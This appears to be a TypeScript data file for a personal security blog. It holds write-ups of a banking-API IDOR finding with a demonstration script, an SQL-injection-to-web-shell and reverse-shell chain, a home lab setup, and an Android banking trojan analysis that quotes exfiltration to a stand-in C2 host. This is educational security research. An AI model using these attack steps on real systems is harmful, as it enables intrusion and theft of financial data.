...
export interface BlogContent {
  type: 'paragraph' | 'heading' | 'code' | 'image' | 'list' | 'blockquote' | 'callout';
  content?: string;
  language?: string;
  level?: number;
  items?: string[];
...
export const blogPosts: BlogPost[] = [
  {
    ...
    description: 'A detailed write-up of how I discovered a critical IDOR vulnerability in a major banking application that could have exposed millions of user accounts.',
    date: '2024-01-15',
    readTime: '12 min',
    ...
    content: [
      ...
      {
        type: 'paragraph',
        content: 'I started by analyzing the mobile application\'s traffic using Burp Suite. After setting up my proxy and installing the SSL certificate, I began mapping out the API endpoints.'
      },
      {
        type: 'code',
        language: 'bash',
...
adb shell settings put global http_proxy 192.168.1.100:8080`
      ...
      {
        type: 'paragraph',
        content: 'While analyzing the API requests, I noticed an interesting endpoint that fetched user account details:'
      },
      {
        type: 'code',
        language: 'http',
...
Content-Type: application/json`
      ...
      {
        type: 'paragraph',
        content: 'The account number "12345678" caught my attention. I wondered what would happen if I changed it to a different number...'
      },
      {
        type: 'code',
        language: 'http',
...
Response:
{
  ...
  "transactions": [...]
      ...
      },
      {
        type: 'callout',
        variant: 'danger',
        content: '🚨 CRITICAL: The API returned another user\'s complete financial information!'
      },
      {
        type: 'heading',
        level: 2,
      ...
      {
        type: 'paragraph',
        content: 'I created a simple Python script to demonstrate the vulnerability (for the security team):'
      },
      {
        type: 'code',
        language: 'python',
...
if __name__ == "__main__":
    ...
    # exploit_idor("12345679", "your_token_here")`
      ...
      {
        type: 'paragraph',
        content: 'I provided the following recommendations to the security team:'
      },
      {
        type: 'code',
        language: 'python',
...
def get_account(account_id):
    ...
    return account.to_json()`
      ...
      {
        type: 'paragraph',
        content: 'Thanks for reading! If you have any questions, feel free to reach out on Twitter @CyberPhantom or connect with me on LinkedIn.'
      }
    ]
  },
  {
    ...
    description: 'How I escalated a simple SQL injection vulnerability to achieve remote code execution on a production server.',
    date: '2024-02-20',
    readTime: '15 min',
    ...
    content: [
      {
        type: 'paragraph',
        content: 'During a recent penetration testing engagement, I discovered how a seemingly simple SQL injection vulnerability could be escalated to achieve full remote code execution on the target server. This write-up details the complete attack chain.'
      },
      {
        type: 'heading',
        level: 2,
      ...
      {
        type: 'paragraph',
        content: 'The target was a web application running on a LAMP stack (Linux, Apache, MySQL, PHP). Initial reconnaissance revealed several interesting endpoints.'
      },
      {
        type: 'code',
        language: 'bash',
...
/backup         (Status: 403)`
      ...
      {
        type: 'paragraph',
        content: 'The search functionality on the website was vulnerable to SQL injection. I used SQLMap for initial testing:'
      },
      {
        type: 'code',
        language: 'bash',
...
[*] performance_schema`
      ...
      {
        type: 'paragraph',
        content: 'I discovered that the MySQL user had FILE privileges, allowing me to write files to the server:'
      },
      {
        type: 'code',
        language: 'sql',
...
INTO OUTFILE '/var/www/html/uploads/shell.php';`
      },
      {
        type: 'callout',
        variant: 'danger',
        content: '🔥 This is why you should never give FILE privileges to web application database users!'
      },
      {
        type: 'heading',
        level: 2,
...
# Linux webserver 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux`
      ...
      {
        type: 'paragraph',
        content: 'For better shell access, I established a reverse shell connection:'
      },
      {
        type: 'code',
        language: 'bash',
...
www-data`
      ...
      },
      {
        type: 'callout',
        variant: 'info',
        content: '📝 This assessment was conducted with proper authorization. Always obtain written permission before testing.'
      }
    ]
  },
  {
    ...
    description: 'A complete guide to setting up your own cybersecurity home lab for practicing penetration testing and security research.',
    date: '2024-03-10',
    readTime: '20 min',
    ...
    content: [
      {
        type: 'paragraph',
        content: 'Every aspiring ethical hacker needs a safe environment to practice their skills. In this comprehensive guide, I\'ll walk you through setting up a professional-grade home lab for cybersecurity research and penetration testing practice.'
      },
      {
        type: 'heading',
        level: 2,
      ...
      {
        type: 'paragraph',
        content: 'Proxmox VE is a powerful open-source virtualization platform. Here\'s how to install it:'
      },
      {
        type: 'code',
        language: 'bash',
...
iface vmbr1 inet static
    ...
    post-down iptables -t nat -D POSTROUTING -s '10.10.10.0/24' -o vmbr0 -j MASQUERADE`
      },
      {
        type: 'callout',
        variant: 'warning',
        content: '⚠️ Always isolate your lab network from your production network to prevent accidental damage!'
      },
      {
        type: 'heading',
        level: 2,
...
sudo apt install hashcat john hydra`
      ...
      {
        type: 'paragraph',
        content: 'With this setup, you\'ll have a professional-grade home lab for practicing ethical hacking. Remember to always practice responsibly and never test on systems you don\'t own or have explicit permission to test.'
      },
      {
        type: 'callout',
        variant: 'success',
        content: '🎯 Pro Tip: Document everything you learn. Start a blog or take notes - it\'ll help you remember and build your professional portfolio!'
      }
    ]
  },
  {
    ...
    description: 'A deep dive into analyzing and reverse engineering a real Android banking trojan to understand its capabilities and behavior.',
    date: '2024-03-25',
    readTime: '25 min',
    ...
    content: [
      {
        type: 'paragraph',
        content: 'In this write-up, I\'ll walk you through the process of reverse engineering an Android banking trojan that I analyzed in my malware research lab. We\'ll cover static analysis, dynamic analysis, and the techniques this malware uses to steal credentials.'
      },
      {
        type: 'callout',
        variant: 'danger',
        content: '☣️ WARNING: Malware analysis should only be performed in isolated environments. Never run malware on your personal devices!'
      },
      {
        type: 'heading',
        level: 2,
...
emulator -avd Pixel_4_API_30 -writable-system`
      ...
      {
        type: 'paragraph',
        content: 'Let\'s start by examining the APK structure and decompiling it:'
      },
      {
        type: 'code',
        language: 'bash',
...
public class BankOverlayService extends AccessibilityService {
    ...
    private void showPhishingOverlay(String bankPackage) {
      ...
      {
        type: 'paragraph',
        content: 'I used Frida to hook into the malware\'s functions at runtime:'
      },
      {
        type: 'code',
        language: 'javascript',
...
[*] Network request to: https://evil-c2.com/api/steal`
      ...
      {
        type: 'paragraph',
        content: 'The malware communicated with a C2 server using encrypted payloads:'
      },
      {
        type: 'code',
        language: 'python',
...
# Output: C2 Command: {"action": "overlay", "target": "com.chase.mobile"}`
      ...
      },
      {
        type: 'callout',
        variant: 'info',
        content: '🔍 These IOCs have been shared with threat intelligence platforms to help protect users.'
      },
      {
        type: 'heading',
        level: 2,
